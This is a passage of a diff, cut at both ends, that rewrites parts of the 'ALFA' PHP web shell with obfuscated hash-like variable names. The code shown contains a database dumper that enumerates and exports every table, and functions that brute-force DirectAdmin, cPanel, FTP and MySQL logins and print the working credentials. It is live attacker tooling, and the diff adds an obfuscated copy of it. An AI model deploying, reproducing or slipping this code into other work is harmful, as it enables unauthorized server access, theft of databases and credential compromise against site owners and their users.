+$surovjlf528d3a0db57c788c744aed5a2ee9f5c8 = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
+$nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677 = json_decode($_POST['alfa2'], true);
+$rgusbycx14c4b06b824ec593239362517f538b29 = ($_POST['alfa3']);
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = ($_POST['alfa4']);
+$pghnyjea4cd4a49f25984e26fe708c1fbd896653 = ($_POST['alfa5']);
+$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b = ($_POST['alfa6']);
+$wlerpykf67b3dba8bc6778101892eb77249db32e = ($_POST['alfa7']);
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
+ array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $wlerpykf67b3dba8bc6778101892eb77249db32e, 'inputSize' => '50'),
  'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $username, 'inputSize' => '50'),
+ array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $rgusbycx14c4b06b824ec593239362517f538b29, 'inputSize' => '50'),
  'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $password, 'inputSize' => '50'),
+ array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $oimndblx5f4dcc3b5aa765d61d8327deb882cf99, 'inputSize' => '50'),
  'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $dbname, 'inputSize' => '50'),
+ array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $pghnyjea4cd4a49f25984e26fe708c1fbd896653, 'inputSize' => '50'),
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']), 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
-$db = false;
-if(!empty($dbname)){
-	$db = @mysqli_connect($host, $username, $password, $dbname);
+$dhkkpmvsd77d5e503ad1439f585ac494268b351b = false;
+if(!empty($pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
+	$dhkkpmvsd77d5e503ad1439f585ac494268b351b = @mysqli_connect($wlerpykf67b3dba8bc6778101892eb77249db32e, $rgusbycx14c4b06b824ec593239362517f538b29, $oimndblx5f4dcc3b5aa765d61d8327deb882cf99, $pghnyjea4cd4a49f25984e26fe708c1fbd896653);
 }
-if(count($selected_data) > 0){
-	if($db){
-		if(!is_dir($dfile)){
-			$dfile = $GLOBALS['cwd'];
+if(count($nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677) > 0){
+	if($dhkkpmvsd77d5e503ad1439f585ac494268b351b){
+		if(!is_dir($abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b)){
+			$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b = $GLOBALS['cwd'];
 		}
-		$tbls = "";
-		$ext = '.txt';
-		if($delimiter == 'json'){
-			$ext = '.json';
+		$ylslqkgi1e64588c114878138fcc7545ef5debcb = "";
+		$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '.txt';
+		if($surovjlf528d3a0db57c788c744aed5a2ee9f5c8 == 'json'){
+			$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '.json';
 		}
-		foreach ($selected_data as $tbl => $cols) {
-			$tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
-			$file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
-			$fp = fopen($file_name, "w");
-			$data = array();
-			while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
-				if($delimiter == "json"){
-					$col_arr = array();
-					foreach ($row as $key => $value) {
-						if(empty($value)){
-							$value = "[empty]";
+		foreach ($nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677 as $msskzybbe6d037be0f9413ca1751cce755f342ab => $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19) {
+			$ctphgqnvb9b0a6b5d256ebaf403659bbc2111742 = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT ".implode(',', $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19)." FROM $msskzybbe6d037be0f9413ca1751cce755f342ab");
+			$fbnucizz3090ad88ff7c9ca191579b709069fe64 = $abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b.'/'.$pghnyjea4cd4a49f25984e26fe708c1fbd896653.'.'.$msskzybbe6d037be0f9413ca1751cce755f342ab.$uzehrcsaabf77184f55403d75b9d51d79162a7ca;
+			$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = fopen($fbnucizz3090ad88ff7c9ca191579b709069fe64, "w");
+			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
+			while($belwysnaf1965a857bc285d26fe22023aa5ab50d = mysqli_fetch_array($ctphgqnvb9b0a6b5d256ebaf403659bbc2111742, MYSQLI_ASSOC)){
+				if($surovjlf528d3a0db57c788c744aed5a2ee9f5c8 == "json"){
+					$wwlyinkm8aed44a4bf4e71f0a28c6a7e8c1f3e39 = array();
+					foreach ($belwysnaf1965a857bc285d26fe22023aa5ab50d as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804) {
+						if(empty($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
+							$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = "[empty]";
 						}
-						 $col_arr[$key] = $value;
+						 $wwlyinkm8aed44a4bf4e71f0a28c6a7e8c1f3e39[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
 					}
-					$data[$tbl][] = $col_arr;
+					$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$msskzybbe6d037be0f9413ca1751cce755f342ab][] = $wwlyinkm8aed44a4bf4e71f0a28c6a7e8c1f3e39;
 				}else{
-					$data = "";
-					foreach ($row as $key => $value) {
-						if(empty($value)){
-							$value = "[empty]";
+					$sfmsaibm8d777f385d3dfec8815d20f7496026dc = "";
+					foreach ($belwysnaf1965a857bc285d26fe22023aa5ab50d as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804) {
+						if(empty($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
+							$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = "[empty]";
 						}
-						$data .= $value . $delimiter;
+						$sfmsaibm8d777f385d3dfec8815d20f7496026dc .= $rkptsoeg2063c1608d6e0baf80249c42e2be5804 . $surovjlf528d3a0db57c788c744aed5a2ee9f5c8;
 					}
-					fwrite($fp, $data ."\n");
+					fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $sfmsaibm8d777f385d3dfec8815d20f7496026dc ."\n");
 				}
 			}
-			if($delimiter == "json"){
-				fwrite($fp, json_encode($data));
+			if($surovjlf528d3a0db57c788c744aed5a2ee9f5c8 == "json"){
+				fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc));
 			}
-			fclose($fp);
-			$tbls .= "Done ~~~> ".$file_name."<br>";
+			fclose($zngnwtjj0666f0acdeed38d4cd9084ade1739498);
+			$ylslqkgi1e64588c114878138fcc7545ef5debcb .= "Done ~~~> ".$fbnucizz3090ad88ff7c9ca191579b709069fe64."<br>";
 		}
 		echo __pre();
-		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
+		echo "<center><font color='#00FF00'>".$ylslqkgi1e64588c114878138fcc7545ef5debcb."</font></center>";
 	}
 }
-if(!empty($dbname) && count($selected_data) == 0){
+if(!empty($pghnyjea4cd4a49f25984e26fe708c1fbd896653) && count($nppckjho0aec3cb72f6201bec9e9eb5ccbe4d677) == 0){
 //echo __pre();
-if($db){
+if($dhkkpmvsd77d5e503ad1439f585ac494268b351b){
 	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
 	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
-	$data = array();
-	$tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
-	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
-		$data[$row["table_name"]] = array();
-		$table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
-		$table_count = mysqli_fetch_row($table_count_q);
-		$data[$row["table_name"]]["data_count"] = $table_count[0];
-		$columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
-		while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-			$data[$row["table_name"]]["cols"][] = $row2["column_name"];
+	$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
+	$ctphgqnvb9b0a6b5d256ebaf403659bbc2111742 = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
+	while($belwysnaf1965a857bc285d26fe22023aa5ab50d = mysqli_fetch_array($ctphgqnvb9b0a6b5d256ebaf403659bbc2111742, MYSQLI_ASSOC)){
+		$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"]] = array();
+		$kqohjgvmc22f50f08ce2bd49269332fe168469af = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT count(*) FROM `".$belwysnaf1965a857bc285d26fe22023aa5ab50d['table_name']."`");
+		$mbnpbrse3c1d1548288c75001565d106dcb05dd6 = mysqli_fetch_row($kqohjgvmc22f50f08ce2bd49269332fe168469af);
+		$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"]]["data_count"] = $mbnpbrse3c1d1548288c75001565d106dcb05dd6[0];
+		$ylrerbsc7d923585d45eaf069fa072333facbbe1 = mysqli_query($dhkkpmvsd77d5e503ad1439f585ac494268b351b, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$belwysnaf1965a857bc285d26fe22023aa5ab50d['table_name']."'");
+		while($rfymspstcb08a1efc05437dd1a1358f362b2ecb8 = mysqli_fetch_array($ylrerbsc7d923585d45eaf069fa072333facbbe1, MYSQLI_ASSOC)){
+			$sfmsaibm8d777f385d3dfec8815d20f7496026dc[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"]]["cols"][] = $rfymspstcb08a1efc05437dd1a1358f362b2ecb8["column_name"];
 		}
 	}
-	mysqli_close($db);
+	mysqli_close($dhkkpmvsd77d5e503ad1439f585ac494268b351b);
 
 	echo '<ul id="myUL">';
-	foreach($data as $tbl => $cols){
-	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
-	    foreach($cols["cols"] as $col){
-	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
+	foreach($sfmsaibm8d777f385d3dfec8815d20f7496026dc as $msskzybbe6d037be0f9413ca1751cce755f342ab => $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19){
+	    echo '<li><span style="color:#00FF00;" class="box">'.$msskzybbe6d037be0f9413ca1751cce755f342ab.' ('.$pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19["data_count"].')</span><ul class="nested">';
+	    foreach($pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19["cols"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0){
+	        echo '<li tbl="'.$msskzybbe6d037be0f9413ca1751cce755f342ab.'"><span style="color:#00FF00;" tbl="'.$msskzybbe6d037be0f9413ca1751cce755f342ab.'" class="box sub-box">' . $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . '</span></li>';
 	    }
 	    echo '</ul></li>';
 	}
@@ -1690,7 +1764,7 @@ alfahead();
 echo('<div class="header">');
 AlfaNum(8,9,10);
 echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"g('dumper',null,null,null,this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); return false;\"><p>";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
@@ -1701,20 +1775,20 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'alfa.sql', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
-$username = ($_POST['alfa3']);
-$password = ($_POST['alfa4']);
-$dbname = ($_POST['alfa5']);
-$dfile = ($_POST['alfa6']);
-$host = ($_POST['alfa7']);
-if(!empty($dbname)){
+$rgusbycx14c4b06b824ec593239362517f538b29 = ($_POST['alfa3']);
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = ($_POST['alfa4']);
+$pghnyjea4cd4a49f25984e26fe708c1fbd896653 = ($_POST['alfa5']);
+$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b = ($_POST['alfa6']);
+$wlerpykf67b3dba8bc6778101892eb77249db32e = ($_POST['alfa7']);
+if(!empty($pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
 echo __pre();
-$msg = "<center>Check this :  <font color='red'>".$dfile."</font></center>";
-if(@mysqli_connect($host,$username,$password,$dbname)){
+$eosqpkxk6e2baaf3b97dbeef01c0043275f9a0e7 = "<center>Check this :  <font color='red'>".$abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b."</font></center>";
+if(@mysqli_connect($wlerpykf67b3dba8bc6778101892eb77249db32e,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$pghnyjea4cd4a49f25984e26fe708c1fbd896653)){
 if(strlen(alfaEx("mysqldump"))>0){
-alfaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
-echo($msg);
+alfaEx("mysqldump --single-transaction --host=\"$wlerpykf67b3dba8bc6778101892eb77249db32e\" --user=\"$rgusbycx14c4b06b824ec593239362517f538b29\" --password=\"$oimndblx5f4dcc3b5aa765d61d8327deb882cf99\" $pghnyjea4cd4a49f25984e26fe708c1fbd896653 > '".addslashes($abgylnfza1f8694b087d3fa0f4f6abbd6725aa3b)."'");
+echo($eosqpkxk6e2baaf3b97dbeef01c0043275f9a0e7);
 }else{
 __alert("Error...!");
 }
@@ -1725,100 +1799,100 @@ echo('<center>mysqli_connect : Error!</center>');
 echo('</div>');
 alfafooter();
 }
-function Alfa_DirectAdmin_Cracker($info){
-if(!$info['mysql'])
-$url = $info['protocol'].$info['target'].':'.$info['port'].'/CMD_LOGIN';
-else $url = $info['protocol'].$info['target'].'/phpmyadmin';
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
-curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
-curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
-curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
-curl_setopt($curl, CURLOPT_HEADER,0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($curl, CURLOPT_URL,$url);
-curl_setopt($curl, CURLOPT_USERPWD, $info['username'].':'.$info['password']);
-if($info['mysql'])curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
-$result = @curl_exec($curl);
-$curl_errno = curl_errno($curl);
-$curl_error = curl_error($curl);
-if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
-elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-$info['target'] = $url;
-CrackerResualt($info);
+function Alfa_DirectAdmin_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+if(!$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['mysql'])
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'].'/CMD_LOGIN';
+else $fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].'/phpmyadmin';
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = curl_init();
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_FOLLOWLOCATION,1);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYPEER,0);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYHOST,0);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HEADER,0);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_URL,$fefubzei572d4e421e5e6b9bc11d815e8a027112);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERPWD, $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']);
+if($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['mysql'])curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = @curl_exec($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+$vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 = curl_errno($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+$aiahketqc719efb0fbd104327ced0c8405304153 = curl_error($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+if ($vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 > 0) {echo "<font color='red'>Error: $aiahketqc719efb0fbd104327ced0c8405304153</font><br>";}
+elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$nmxeqhvab4a88417b3d0170d754c647c30b7216a)){
+echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
+$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'] = $fefubzei572d4e421e5e6b9bc11d815e8a027112;
+CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
 }
-curl_close($curl);
+curl_close($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
 }
-function Alfa_CP_Cracker($info){
-$url = $info['protocol'].$info['target'].':'.$info['port'];
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
-curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
-curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
-curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
-curl_setopt($curl, CURLOPT_HEADER,0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
-curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: Basic " . __ZW5jb2Rlcg($info['username'].":".$info['password']) . "\n\r"));
-curl_setopt($curl, CURLOPT_URL, $url);
-$result = @curl_exec($curl);
-$curl_errno = curl_errno($curl);
-$curl_error = curl_error($curl);
-if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
-elseif(preg_match('/filemanager/i',$result)){
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-$info['target'] = $url;
-CrackerResualt($info);
+function Alfa_CP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'];
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = curl_init();
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_FOLLOWLOCATION,1);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYPEER,0);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_SSL_VERIFYHOST,0);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HEADER,0);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_RETURNTRANSFER,1);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_HTTPHEADER, array("Authorization: Basic " . __ZW5jb2Rlcg($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].":".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']) . "\n\r"));
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_URL, $fefubzei572d4e421e5e6b9bc11d815e8a027112);
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = @curl_exec($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+$vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 = curl_errno($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+$aiahketqc719efb0fbd104327ced0c8405304153 = curl_error($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+if ($vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 > 0) {echo "<font color='red'>Error: $aiahketqc719efb0fbd104327ced0c8405304153</font><br>";}
+elseif(preg_match('/filemanager/i',$nmxeqhvab4a88417b3d0170d754c647c30b7216a)){
+echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
+$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'] = $fefubzei572d4e421e5e6b9bc11d815e8a027112;
+CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
 }
-curl_close($curl);
+curl_close($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
 }
-function Alfa_FTP_Cracker($info){
-$url = $info['protocol'].$info['target'];
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($curl, CURLOPT_USERPWD, "".$info['username'].":".$info['password']."");
-$result = @curl_exec($curl);
-$curl_errno = curl_errno($curl);
-$curl_error = curl_error($curl);
-if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
-elseif(preg_match('/(\d+):(\d+)/i',$result)){
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
-$info['target'] = $url;
-CrackerResualt($info);
+function Alfa_FTP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['protocol'].$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'];
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = curl_init();
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_URL, $fefubzei572d4e421e5e6b9bc11d815e8a027112);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($qqhrnrcwf6e57c9de709e45feb0d955351f53548, CURLOPT_USERPWD, "".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].":".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']."");
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = @curl_exec($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+$vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 = curl_errno($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+$aiahketqc719efb0fbd104327ced0c8405304153 = curl_error($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
+if ($vgdiddxr698e6eabbdf9fadfceadfd2ebf5b4545 > 0) {echo "<font color='red'>Error: $aiahketqc719efb0fbd104327ced0c8405304153</font><br>";}
+elseif(preg_match('/(\d+):(\d+)/i',$nmxeqhvab4a88417b3d0170d754c647c30b7216a)){
+echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
+$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'] = $fefubzei572d4e421e5e6b9bc11d815e8a027112;
+CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
 }
-curl_close($curl);
+curl_close($qqhrnrcwf6e57c9de709e45feb0d955351f53548);
 }
-function Alfa_Mysql_Cracker($info){
-if(@mysqli_connect($info['target'].':'.$info['port'],$info['username'],$info['password'])){
-CrackerResualt($info);
-echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
+function Alfa_Mysql_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+if(@mysqli_connect($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].':'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'])){
+CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);
+echo 'UserName: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].'</font> PassWord: <font color="red">'.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password'].'</font><font color="green">  Login Success....</font><br>';
 }
 }
-function Alfa_FTPC($info){
-if($con=@ftp_connect($info['target'],$info['port'])){
-if($con){
-$login=@ftp_login($con,$info['username'],$info['password']);
-if($login){CrackerResualt($info);}}}
-@ftp_close($con);
+function Alfa_FTPC($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+if($kghebeva7ed201fa20d25d22b291dc85ae9e5ced=@ftp_connect($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['port'])){
+if($kghebeva7ed201fa20d25d22b291dc85ae9e5ced){
+$predzshad56b699830e77ba53855679cb1d252da=@ftp_login($kghebeva7ed201fa20d25d22b291dc85ae9e5ced,$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'],$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']);
